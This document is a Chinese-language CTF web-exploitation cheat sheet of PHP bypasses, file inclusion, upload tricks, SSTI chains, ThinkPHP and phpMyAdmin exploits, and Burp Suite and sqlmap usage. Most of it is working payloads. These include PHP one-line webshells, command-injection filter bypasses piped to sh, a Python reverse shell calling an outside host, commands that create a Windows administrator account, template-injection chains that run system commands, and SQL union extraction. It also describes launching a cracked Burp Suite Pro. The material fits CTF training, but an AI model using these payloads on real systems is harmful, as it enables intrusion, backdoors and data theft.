        过滤 if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
            空格用%20, 使用 dir,  dir%20/ , -- 2019 安洵杯Web easy_web
    
        只能使用指定math常用数学函数 [CISCN 2019 初赛]Love Math
    
        SQL过滤select等尝试堆叠注入



### 正则绕过 pregmatch / bypass
preg_match()返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。
preg_match_all()不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。

### 利用PHP的字符串解析特性Bypass
https://www.freebuf.com/articles/web/213359.html

#### 取反码 preg_match("/[A-Za-z0-9]+/",$code)

```php
$str = ~"phpinfo";
echo urlencode($str);
phpinfo() == (~%8F%97%8F%96%91%99%90)()
paylaod: ?code=(~%8F%97%8F%96%91%99%90)();
```
#### `substr_count($query, '_') !== 0, 使用%20代替_`
#### `preg_match('/^23333$/') 用%0a即换行绕过$`


### js弱类型
```js
if (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0]))

{"e":paylod,"first":[0],"second":"0"}
```
### LFI - Local File Include

### %00 截断问题 CVE-2020-7066
`[GKCTF2020]cve签到` bp抓包 00截断
```
http://xx.cn/?url=http://127.0.0.123%00www.ctfhub.com
```


http://web.jarvisoj.com:32785/

?page=xxxx

?page=xxxx%00 就可以截断

首先是把php上传（改文件名、改Content-Type，改文件内容，图片马），然后是如何解析并执行php（web容器的解析漏洞、php文件包含）。

    <?php @eval($_POST['pwd']);?>
    <script language="php">@eval_r($_POST['pwd'])</script>



#### $_REQUEST数据覆盖问题
2018NCTF_easy_audit
Request 变量默认情况下包含了$GET，$POST和$COOKIE的数组。 未设置时，从左向右注册。可覆盖。

__$ SERVER['QUERY STRING']__

$_SERVER是预定义服务器变量的一种，所有$_SERVER开头的都是预定义服务变量。

```
示例：
http://localhost/aaa/index.php？p=222&q=333
结果：
$_SERVER['QUERY_STRING]="p=222&q=333"；
```

### __wakeup()
__wakeup()方法中$this->username = 'guest'会让username重新赋值。在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行，我们可以将字符串中O:4:"Name"后面的2改为3及以上的整数

```
O:4:"Name":2:{s:14:" Name username";s:5:"admin";s:14:" Name password";i:100;}
O:4:"Name":3:{s:14:" Name username";s:5:"admin";s:14:" Name password";i:100;}
```
注意该类中使用的private来声明字段，private在序列化中类名和字段名前都要加上ASCII 码为 0 的字符(不可见字符)，如果我们直接复制结果，该空白字符会丢失，需要我们自己加上

`O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}`

将该字符串作为select参数的值，GET方式发送过去就可以获得flag

http://题目链接/?select=O:4:%22Name%22:3:{s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;}

### shell绕过
[命令执行的绕过技巧](https://www.dazhuanlan.com/2019/10/05/5d97c963e2513/)

$IFS和$IFS$9来绕过空格过滤

```
payload1：?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
payload2：?ip=|echo$IFS$9Y2F0IC9mbGFn|base64$IFS$9-d|sh

绕过  if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
      ;a=g;cat$IFS$1fla$a.php

GXYCTF2019]Ping Ping Ping
https://www.gem-love.com/ctf/516.html
https://0day.design/2018/12/20/Swpu%20CTF%202018%20Writeup/
https://www.cnblogs.com/wrnan/p/12811449.html
https://www.cnblogs.com/yesec/p/12475478.html
https://www.google.com/search?q=preg_match(%22%2F.*f.*l.*a.*g.*%2F%22&oq=preg_match(%22%2F.*f.*l.*a.*g.*%2F%22&aqs=chrome..69i57&sourceid=chrome&ie=UTF-8
```


### assert 执行


注意到 assert("strpos('$file', '..') === false") or die("Detected hacking attempt!") 这句话，查了一下 strpos，感觉可以拼接一下，但是自己不熟悉 PHP，只能去看题解。

可以执行任何 PHP 命令

构造 $file='.system('ls').'，意思就是用 . 来拼接 system 的返回结果

http://web.jarvisoj.com:32798/?page='.system('ls').'

http://web.jarvisoj.com:32798/?page='.system('cat templates/flag.php').'

看源码显示的flag。

### 绕开disable_functions
`[极客大挑战 2019]RCE ME`
https://blog.csdn.net/qq_45163122/article/details/105914054
https://blog.csdn.net/mochu7777777/article/details/105136633

蚁剑，下载插件绕过diable_functions, 下载后主界面点击  设置-绕过diable_functions
选择PHP_GC_UAF模式
点击开始

## 种子爆破 seed/mt_srand/rand
[[GWCTF 2019]枯燥的抽奖](https://github.com/gwht/2019GWCTF/tree/master/wp/web/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96)
https://xz.aliyun.com/t/3656#toc-3

## php .user.ini

创建.user.ini文件----UTF8编码

    GIF89a                  //绕过exif_imagetype()
    auto_prepend_file=a.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。
    auto_append_file=a.jpg  //解析后进行包含

然后构造一个a.jpg  UTF8编码，内容如下：

    GIF89a
    <script language='php'> @eval($_POST['pass']);</script>

然后在上传路径需要有个可执行的php, 比如都上传到了 /uploads/123/下 有index.php

最后直接访问 /uploads/123/index.php 连接webshell.

条件：

1、服务器脚本语言为PHP
2、服务器使用CGI／FastCGI模式
3、上传目录下要有可执行的php文件
实例：上传.user.ini绕过黑名单检验

## php 代码分析

    $first ="hello";
    $hello ="world";
    echo $first." ".$$first;
    结果是 hello world
    $$first就是$hello，因为$first的值是hello
    
    var_dump($$args) , flag可能存在于 , 全局变量 $GLOBALS , ?args=GLBOALS


[BJDCTF2020]Mark loves cat

```
foreach($_GET as $x => $y){

$a='fg';
$$a='xx'`; //可变变量表示
$fg='xx';
```

`[GWCTF 2019]我有一个数据库` phpadmin4.8.1漏洞

```php
payload: /phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../etc/passwd
```
## php://input
读取POST请求
例实现 text=='I have a dream'

?text=php://input , 请求改为POST, 在body传 I have a dream

![phpinput](imgs/php_phpinput.jpg)

```php
<?php
$ok=$_POST['ok'];
$ok2=$_POST['ok2'];
$test=readfile('php://input', 'r'); //ok=1&ok=2
```
https://blog.csdn.net/qq_14989227/article/details/79444940

## php://filter元封装器, 读取文件
先测试是否正确  `php://filter/read=convert.base64-encode/resource=/etc/passwd` 再尝试其他文件。

文件包含 `?file=php://filter/read=convert.base64-encode/resource=flag.php`


encode后面可以随意加字符 套一层协议, 既包含有woofers这个字符串，也不会影响正常的包含
```
php://filter/convert.base64-encode/woofers/resource=flag
```

    名称  描述
    resource=<要过滤的数据流>这个参数是必须的。它指定了你要筛选过滤的数据流。
    read=<读链的筛选列表>该参数可选。可以设定一个或多个过滤器名称，以管道符（）分隔。
    write=<写链的筛选列表>该参数可选。可以设定一个或多个过滤器名称，以管道符（）分隔。
    <；两个链的筛选列表>任何没有以read=或write=作前缀的筛选器列表会视情况应用于读或写链。
    
    过滤器列表：http://php.net/manual/zh/filters.php
    
    --- web2
    页面1 http://xxx/?user='%23 -- 注释字符抓包，python生成字典。burp 暴破。
    本题限制了4位字符 '%1%23 刚好4位
    
    页面2 抓所看到 .viminfo 访问一下。
    找一个unicode字符和英文字符一样的。代替一下目标字符就能过waf
    
    页面3 
    使用path=http://127.0.0.1/&filename=1.txt
      写文件到upload目录下, 访问这个1.txt
    尝试 path=http://127.0.0.1/xxx.php?usern3me=<?php info();?>&filename=1.txt
      发现可以访问，但是需要编码。
    尝试 path=http://127.0.0.1/xxx.php?usern3me=<?php system($_[REQUEST[0]);?>&filename=1.txt
    改成PHP文件 path=http://127.0.0.1/xxx.php?usern3me=<?php system($_[REQUEST[0]);?>&filename=1.php
      用Hackbar上面的Encoding进行URL编码。空格要2次编码
      %20 改成 %2520
      %3D 是 =
    直接用它来执行命令 path=http://127.0.0.1/1.php?0=ls ../ 找到flag文件
    查看 path=http://127.0.0.1/1.php?0=cat ../flag_is_here.php 查看源代码
    https://www.freebuf.com/vuls/116705.html
    
    读取文件
    php://filter/read=convert.base64-encode/resource=show.php
    Burp Suite - Decoder 中可以解base64,
    
    构造Cookie问题
    ?line=1&filename=show.php
    用bp暴破， line=1字段 读取每一行 ，整合代码发现需要构造 Cookies: margin ,读取keys.php
    添加header头 Cookie: margin=margin; 
        filename=xxx替换成filename=keys.php的base64编码，读取完成。
## phar/zip协议
关于phar的格式：https://blog.csdn.net/u011474028/article/details/54973571

关于phar://的利用：https://xz.aliyun.com/t/2715

[[CISCN2019 华北赛区 Day1 Web1]Dropbox](https://www.jianshu.com/p/5b91e0b7f3ac)


压缩为zip改为jpg

```
test.zip
  ┗━━php.jpg

http://example.com/include/include2.php?file=zip://test.zip#php

phar://php.zip/php.jpg
```

[[CISCN2019 华北赛区 Day1 Web1]Dropbox](https://www.jianshu.com/p/5b91e0b7f3ac)
1.任意文件下载, index.php, download.php, register.php, class.php, delete.php, 
## preg_replace() /e 代码执行漏洞, 与双引号执行
[[BJDCTF2020]ZJCTF，不过如此](https://blog.csdn.net/qq_43622442/article/details/106018883)
https://www.cnblogs.com/wangtanzhi/p/12328083.html

```php
preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")', // 双引中的\\1会执行
        $str
    );
```

双引号里面如果包含有变量，php解释器会进行解析

    双引号中倘若有${}出现，那么{}内的内容将被当做代码块来执行。
    $a = 1;
    $b = 2;
    echo '$a$b';//输出结果为$a$b
    echo "$a$b";//输出结果为12

/e 修正符使 preg_replace() 将 replacement 参数（第二个参数，字符串）当作 PHP 代码执行。`

payload1:

`next.php?\S*=${getflag()}&cmd=system('cat /flag');`
。。。 php 参数中的`.`会被替换成`_`。所以不能 `.*`

payload2:通过构造post传参

```
next.php?\S*=${eval($_POST[wtz])}
POST：
wtz=system("cat /flag");
```
hackbar成功, 但burpsuit没成功，通过捕获hackbar执行的请求，发现要bp要添加

`Content-Type: application/x-www-form-urlencoded`

## Thinkphp 
Thinkphp 5.0.0 ~ 5.0.23

构造报错  `http://127.0.0.1/index.php?s=1` 查看到版本 THINK_VERSION5.0.23
```
http://871de986-e788-4308-93b1-56afc5801c28.node3.buuoj.cn/?s=captcha

POST:

_method=__construct&filter[]=system&method=get&get[]=ls /
_method=__construct&filter[]=system&method=get&get[]=cat /flag
```
## php 相关函数


常用方法

    "highlight_file","show_source","readfile","file_get_contents"
    "exec","shell_exec","system","passthru","proc_open","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents", "unserialize"
    "/dir/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i


    windows下 type flag.php
    Linux      cat flag.php
    
    输出 print_r, vardump(array), 把array 转字符串

vardump的结果
```php
Array
(
    [0] => HTTP/1.1 301 Moved Permanently
    // ...
    [41] => EagleId: da5c002216039455321251944e
)

```

echo vardump(array), 把array打出来


pos(localeconv()) => '.'
scandir(pos(localeconv())) => scandir('.')

看一下当前目录下的文件，`?exp=echo(var_dump(scandir(pos(localeconv()))));`

assert
    
    bool assert(mixed $assertion[,string $description])，
    如果assertion是字符串，他会被assert()当做php代码执行。

就是说如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行

那么我们就可以构造payload

    ?page='.system("cat templates/flag.php").'


$tem_name = $_FILES['file']['tmp_name'];    // 取得文件后缀名 

$_FILES["file"]["name"] - 被上传文件的名称

$_FILES["file"]["type"] - 被上传文件的类型

$_FILES["file"]["size"] - 被上传文件的大小，以字节计

$_FILES["file"]["tmp_name"] - 存储在服务器的文件的临时副本的名称

$_FILES["file"]["error"] - 由文件上传导致的错误代码

获取客户端IP `[BUUCTF 2018]Online Tool`

```php
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
```
## shtml shtml, Apache SSI 远程命令执行漏洞 `[BJDCTF2020]EasySearch`

可控处进行上传代码，看在哪里返回shtml，访问一下。

```
<!--#exec cmd="whoami" -->
<!--#exec cmd="ls"-->
<!--#exec cmd="pwd"-->
<!--#exec cmd="find / -type f -name flag*"-->
<!--#exec cmd="cat /var/www/html/flag_990c66bf85a09c664f0b6741840499b2"-->
```

# Burp Suite

启动命令
```
普通启动
javaw -jar burploader.jar
跳过loader
javaw -noverify -javaagent:burploader.jar -jar burpsuite_pro_v2021.6.2.jar
禁止缩放 防止光标错位
javaw -noverify -Dsun.java2d.uiScale=1 -javaagent:burploader.jar -jar burpsuite_pro_v2021.6.2.jar
```



原文件 https://pan.baidu.com/s/1ryHY4ZFwJDkrblGuIGGFgw#0m7h

https://t0data.gitbooks.io/burpsuite/content/chapter3.html

Intuder 注意, payloads最下面转义(url encode)有时候需要关掉

User Option - Display - Http Message Display, 使用宋体

排除地址, 拦截的时候 Proxy - Intercept - Action - Don't intercept request =>

    Target选项卡-scope include .* .* .*
    Target选项卡-scope exclude .*firefox.*

Proxy-Option-Intercept Client Requests, 添加does not match [url]

    ^.*(bdstatic|baidu|g-fox|firefox|mozilla|google|alicdn).*$
    可能Scope中使用advanced scope也要排除

exclude url from histroy

    1. Proxy - Options - Miscellaneous - Don't send items to Proxy history or live tasks, if out of scope
    2. Project Options选项卡 - Out of Scope requests -  Drop all , 开启后其他地址返回404

拦截指定网址

    方法1 “Proxy”选项卡--选择“Options”菜单--往下看到“Intercept Client Requests”节区
    方法2 你可以使用“include in-scope items only(仅仅包括在范围内的项目)”以减少数据必须保存量。


[Intuder](https://blog.51cto.com/laoyinga/2151018)
    
    几种模式对应不同的payload数量
    
    结果过滤
        flag\{.*\}
        ctfhub\{.*\}

添加自定义header

  Proxy - Options - Match and Replace
  match为空就是添加
       添加到 response header, match空
       replace: Content-type:text/html;charset=utf-8


## 快捷键
```
Ctrl T, Toggle Intercept
Ctrl Shift P, Switch to Proxy
Ctrl Shift I, Switch to Intruder
Ctrl Shift R, Switch to Repeater
Ctrl +/-, 切换标签
```
## Burp Suite常见问题
GET改POST请求

    自动修改： 推荐---, 右击 Change request method
    手动修改： 添加  `Content-Type: application/x-www-form-urlencoded`

refresh 自动刷新的变量字段。
Options - Grep Match 常用，密码错误的时候，可以添加一个匹配关键字。开始攻击后会多一个字段。[^1]

      结果中也可以过滤(在标签Result下面)，
      grep - match 添加过滤字段 login_error,比返回长度效果更好。
      runtime file 每行作为一个
      custom iterator , 可以生成像 username@@password  ，选posisiton 2 @@, position3 password,
      copy other payload , 两次payload值要一样时使用。

wordpress , ?author=1 可以知道 id=1的用户
## Burp Suit 和 Hackbar 使用一句话木马

注意使用 POST 方法提交哦。

__1、 Burp Suite：__

1) 拦截到页面请求, 将其转到 Repeater, 并在最下方加入请求参数:

    shell=system("find / -name 'flag*'");

2) 查看 Response, 最下方有目标文件路径:3) 修改 Repeater 中的请求参数为:

    shell=system("cat /var/www/html/flag.txt");
4) 查看 Response 中的结果:

__2､ HackBar:__

1) 在 HackBar 中输入相应 URL 和请求参数, 请求参数为需要执行的 shell:

    shell=system("find / -name 'flag*'");

2） 在原先的页面可以看到相应结果， 在最下面即是目标文件的路径， 如下图所示：

3） 继续在 Hackbar 中执行命令：

    shell=system("cat /var/www/html/flag.txt");

4） 在原页面即可查看到 flag.txt 中的 flag 内容：

## Burp Suite暴力破解一句话木马
一句话木马

    PHP:<?php @eval($_POST['pwd']);?>
    PHP:<?php @eval(_POST['v5estOr']);?>
    <script language="php">@eval_r($_POST['cmd'])</script>
    
    --php5试用 1.phtml
    GIF89a? <script language="php">eval($_REQUEST[shell])</script>
    --修改content-type为image/jpeg
    
    ASP:<%eval request("v5estor")%>

一般来说,一句话木马通过POST方式的传参方式如下(以写出字符的语句为例):

    PHP:v5estor=echo "password is v5estor";
    ASP:v5estOr=response.write("password:v5estor")

已确定一句话木马地址为hack.php, 用hackbar 捕获hack.php 请求， 发送到Intruder ,将 v5estor 添加为变量，暴破一句话木马变量地址。grep - match 字段添加，password is 。 暴破后正确输出 password is 为成功为一句话木马的变量。
### 图片马

winhex打开图片，在最后粘贴马。

## Burp Suite 破解文件上传
普通难度： 

    抓包, 1. 改 content-type即可。 image/png
    抓包, 2. 改 file-name 即可。 image/png

High级别---系统认可图片

    copy test.png/b+test.html/a a.png
    test.html:  `<script>alert(1)</script>`

用来上传php, 比如 `copy test.png/b+hack.php/a caidao.png`

hack.php 里写一句话木马  :<?php @eval(_POST['1']);?>

查看有没效果

http://192.168.1.107/dwva/vulnerabilities/fi/?page=/hackable/uploafs/caidao.png   

hackbar

URI： http://192.168.1.107/dwva/vulnerabilities/fi/?page=C:\www\DWVA\hackable/uploads/hack.png

    POST:1=echo '<pre>';system('ipconfig')
    POST:1=echo '<pre>';system('net user hack 123456/add');
    POST:1=echo '<pre>';system('net localgroup administrators hack /add'):

## Burp Suite配合SQLmap实现被动式注入发现

    User Option - Misc - Logging, √Proxy Request ,选择一个文件位置保存。
    打开文件搜索请求，确定请求存在。
    sqlmap.py -r 文件目录
    sqlmap.py -r C:\log\1.txt --batch
    找到并查看 outout文件。在txt中找到注入链接, 比如，测试
    sqlmap.py -u "http://192.168.1.102/inject.php?id=2" --dbs

## Burp Suite数据获取测试
用BP抓个包 比如 http://192.168.1.102/inject.php?id=1

`在1后面加a 1$a$ a设置成字段。`

Payloads- Payloads Options , Load , 找 FuzzLists目录下的 sqli-union-select

用Intruder 开始攻击, 查看结果-Response

查看结果后 确定为3个字段，在结果里右击查询3字段的发送到repeater, Go一下。

     在params里 select%201,2,3 from a   测试a表是否存在。显示 doesn't exist, 将它 设置成Grep Match 字段进行过滤。
     payloads load,  common-tables进行start attack。

查看结果， 确定admin为表名。继续修改params 猜列名

        select%201,a,3%20from%20admin 显示 unkonwn column ，将请求必到Intruder,
          将 a 设置成变量， unkonwn column为过滤字段。
          payload - load, comman - column
          start attack,查看结果。
          确定了id , password, 列。
        -1 union all select%201,password,3%20from%20admin
        -1 union all select%201,password,3%20from%20admin limit 0, 1
发到 Intruder

    id=1 union all select 1,2,3 from admin#
    id=1 union all select 1,password,3 from admin#
    id=1 union all select 1,concat(id, username, password),3 from admin#
    id=1 union all select 1,concat(id,0x7c, username,0x7c, password),3 from admin#
     0x7c是管理符 | 

发到intruder, 

      limit%20$0$,1 这里将0改为字段了。limit参数为：偏移量，最大数目
    
      payload type: numbers,
        from 0, to 3, step 1,
      start attack

Grep Extract, add选中后会自动正则。 清除多余的过滤。b

菜单栏 save - result table, 只留一个正则。保存

## Burp Suite目录与文件扫描测试
1.抓包 history中， 发到Intruder

2.Positions

      payload 加载  php去重复.txt 字典
      payload 选项卡 中有 Payload Encoding √要去掉 （否则会编码/符号）
      start attack
      在结果列表， Filter 只勾2xx

# Python

反弹shell
    
    python反弹shell
    
    /no_one_know_the_manager?key=自己填key&shell=python%20-c%20%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22xx.xx.xx.xx%22,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27

## ssrf
`[De1CTF 2019]SSRF Me`
## ssti

[hideandseek](https://www.baidu.com/s?wd=hctf2018+hideandseek)

/proc/self/cmdline
/proc/self/environ
wsgi.ini

读取mac地址 /sys/class/net/eth0/address

linux service 越权

### ssti smarty
`[BJDCTF2020]The mystery of ip`
`[CISCN2019 华东南赛区]Web11`

```
{if phpinfo()}{/if}
{if system('ls')}{/if}
{ readfile('/flag') }
{if show_source('/flag')}{/if}
{if system('cat /flag')}{/if} #本题payload
{if system('cat ../../../flag')}{/if} #本题payload
X-Forwarded-For: {{system("ls")}}
X-Forwarded-For: {{system("cat /flag")}} #本题payload
```

### ssti 服务器模板注入 twig

```
user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```
### ssti 服务器模板注入 jinj2
`buuoj [RootersCTF2019]l_<3_Flask`

[[WesternCTF2018]shrine](https://www.cnblogs.com/Cl0ud/p/12316287.html)

    {{self.__dict__}}
    {{url_for.__globals__['current_app'].config}}
    {{get_flashed_messages.__globals__['current_app'].config}}



[pasecactf_2019]flask_ssti](https://guokeya.github.io/post/zIiwsY95N/)


内置函数 `print(help(dir(__builtins__)))`

ssti方式
```
/hello?name={{7*7}}
/hello?name={{config}}
pip install flask-unsign
flask-unsign --sign --cookie "{'balance': 666666}" --secret "XMM<XMK"

原题目通过lfi, 文件穿越
/downloadj?image=1.jpg
/downloadj?image=../../../../../../../etc/passwd/

查看程序环境变量
/downloadj?image=../../../../../../../proc/self/environ
看到secret_key
```

### PIN码

debug 才有PIN码问题

```html
{{...}}报错
```
得到，PIN码怎样访问？

```html
name={{...}} 看报错信息，
```

找一行，点右边的terminal图标，输入PIN码。进入console。

```python
## console中执行
import os
os.system('ls') # 并没有得到返回输出全部内容，返回了0.只得到返回值
os.popen('ls').read() # 得到了结果。
os.popen('ls /').read()
os.popen('ls /app').read() # 发现 flag
os.popen('cat /app/flag').read()
## 也可以写个反向shell，拿到更多权限。
```

### ssti注入

测试

<pre>/hello?name=

{% for i in range(10) %}

{% print(i) %}

{% endfor %}

</pre>

输出了结果，说明有漏洞

```python
/hello?name={{"".__class__}} 返回str
/hello?name={{"".__class__.__base__}}
/hello?name={{"".__class__.__base__.__subclasses__()}}
/hello?name={{"".__class__.__base__.__subclasses__()[302]}} # popen
/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__}}
/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__.__globals__}}
/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__.__globals__["os"].popen("ls").read()}}
/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__.__globals__["os"].popen("ls /").read()}}
/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__.__globals__["os"].popen("ls /app").read()}}
/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__.__globals__["os"].popen("cat /app/flag").read()}}
```
方式2
```py
# 读取app.py  -- [GYCTF2020]FlaskApp
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read()}}{% endif %}{% endfor %}
# 读目录 ls/
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}{% endif %}{% endfor %}
# 拼接大法
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}{% endif %}{% endfor %}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()}}{% endif %}{% endfor %}
```

生产环境不要开debug模式
### ssti注入_tornado

[2018护网杯easy_tornado(BUUCTF提供复现)](https://blog.csdn.net/zz_Caleb/article/details/101473013)

那么tornado中的cookie通过handler.settings对象

handler 指向RequestHandler
而RequestHandler.settings又指向self.application.settings
所有handler.settings就指向RequestHandler.application.settings了！

传递error?msg={{ handler.settings }}得到：

'cookie_secret': 'b8e09977-6541-498b-9a30-08e3118b6e60'}

filehash: md5(cookie_secret+md5(filename))

# Java项目

Java项目 WEB-INF/web.xml  见[[ROARCTF 2019]EASY JAVA](https://www.freesion.com/article/9774220249/)

WEB-INF主要包含一下文件或目录:

    /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
    /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
    /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
    /WEB-INF/database.properties：数据库配置文件
    漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码

构造PAYLOAD:

    filename=WEB-INF/classes/com/wm/ctf/FlagController.class

`[网鼎杯 2020 青龙组]filejava`

```
    ../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml
    <servlet>
        <servlet-name>UploadServlet</servlet-name>
        <servlet-class>cn.abc.servlet.UploadServlet</servlet-class>
    </servlet>
    访问servlet,下载反编译
    ../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/UploadServlet.class
```


# 其他内容
## JWT
http://jwt.io
工具： https://github.com/brendan-rius/c-jwt-cracker

3部分构成：
```json
{"alg":"HS256","typ":"JWT"}{"username":"123456"}wÈRîwqerwqe
1. 算法 2. payload 3. 签名
```
## .git 泄漏

扫描 发现 .git 目录，

使用Web_Git_Extract-master.zip 提取

python2 git_extract.py http://106.75.72.168:9999/.git/

和  http://106.75.72.168:9999/flag.js 对比得到结果。

## Curl发送请求
`curl -v -X CTFHUB http://challenge-d8eeddbeb7a64576.sandbox.ctfhub.com:10080/index.php`

## 地址猜想
phpmyadmin 地址

    http://pma.wechall.com
    http://pma.wechall.net
    https://pma.wechall.net

## linux命令

### nl/od *执行命令(当前目录下所有文件) / 短命令 /short/strlen
number lines

`>nl *` 生成文件nl写入星
例
```
# nl
*
```
```php
<?php
show_source(__FILE__);
error_reporting(0);
if(strlen($_GET[1])<4){
     echo shell_exec($_GET[1]);
}
else{
     echo "hack!!!";
}
?>
```
shellexec(*) 时会执行当前目录下的所有文件, 相当于执行了nl *, 就会把数据输出了(源码看)

```
?1=>nl
?1=*
#还有另一个命令od（八进制输出）也是可以的
```